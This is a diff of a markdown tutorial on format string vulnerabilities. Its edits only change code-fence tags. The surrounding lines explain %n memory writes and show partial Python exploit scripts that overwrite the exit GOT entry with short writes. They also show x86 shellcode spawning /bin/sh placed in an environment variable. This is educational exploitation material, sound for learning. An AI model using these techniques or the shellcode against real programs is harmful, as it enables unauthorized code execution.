@@ -489,13 +489,13 @@ Knowing this, it is possible to hijack the execution flow by overwriting the GOT
 As we have seen above, it is possible to **read** from memory, which is good to leak memory, but a way to **write** into memory is needed to abuse the vulnerability and redirect code execution. Luckily, as stated in the previous section, a format specifier can be used to write: `%n`. Using `%n` allows to write the number of bytes from the beginning to the string to where the specifier is in place, for instance:
 
 
-```C
+```c
 int count = 0;
 printf("whatever %n you say\n", &count);
 printf("count = %d\n", count);
 ```
 
-```
+```c
 whatever you say
 count = 9
 ```
@@ -504,7 +504,7 @@ In this example, the count of characters written is being stored in the `count` 
 
 Under this premise, the next step is to create an exploit that can write to a specified memory address, in this case, to the address containing the `exit` GOT entry.
 
- ```python=
+ ```python
  import struct
 
 exit_fnc = 0x8049724 # exit actual address in the GOT
@@ -545,7 +545,7 @@ hit breakpoint at: 8048508
 
 The content of `exit`'s GOT entry has been successfully modified, the next step is to overwrite its content with the address of `hello`. One additional strategy that can facilitate the exploitation of a format string is to use a short write. A *short* is a two-byte word and there is a format specifier that allows us to deal with *shorts* (`h`). Since the address of `hello` is formed by 4 bytes, it can be divided into two short writes one to `0x08049724` and another to `0x08049726`:
 
-```python=
+```python
 import struct
 
 exit_fnc = 0x8049724
@@ -596,7 +596,7 @@ hex     0x84b0
 
 Therefore, the number `33968 dec` needs to be written into the address `0x080484b4`:
 
-```python=
+```python
 import struct
 
 exit_fnc = 0x8049724
@@ -656,7 +656,7 @@ Depending on the environment variables present, the position of the shellcode va
 
 The following python script was used to achieve this:
 
-```python=
+```python
 import os
 
 environ = dict(S="\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80")
